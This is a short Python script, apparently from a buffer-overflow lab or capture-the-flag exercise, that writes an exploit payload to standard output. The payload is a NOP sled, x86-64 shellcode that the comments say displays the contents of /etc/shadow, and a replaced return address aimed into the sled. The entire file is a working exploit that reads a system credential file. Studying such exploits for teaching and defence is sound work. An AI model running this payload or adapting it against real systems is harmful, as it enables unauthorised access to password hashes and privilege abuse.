#!/bin/python3
import sys

payload = ""

# fill the unused buffer space with 0x90, the opcode
# for NOP
sys.stdout.buffer.write(b'\x90'*182)

# 82 bytes of shellcode payload
# that will display the contents of /etc/shadow
sys.stdout.buffer.write(b'\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66')
sys.stdout.buffer.write(b'\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f')
sys.stdout.buffer.write(b'\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0')
sys.stdout.buffer.write(b'\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65')
sys.stdout.buffer.write(b'\x74\x63\x2f\x73\x68\x61\x64\x6f\x77\x41')

# insert our new return address on the stack which should
# point to an address early on our NOP sled
sys.stdout.buffer.write(b'\x7f\xff\xff\xff\xde\x40'[::-1])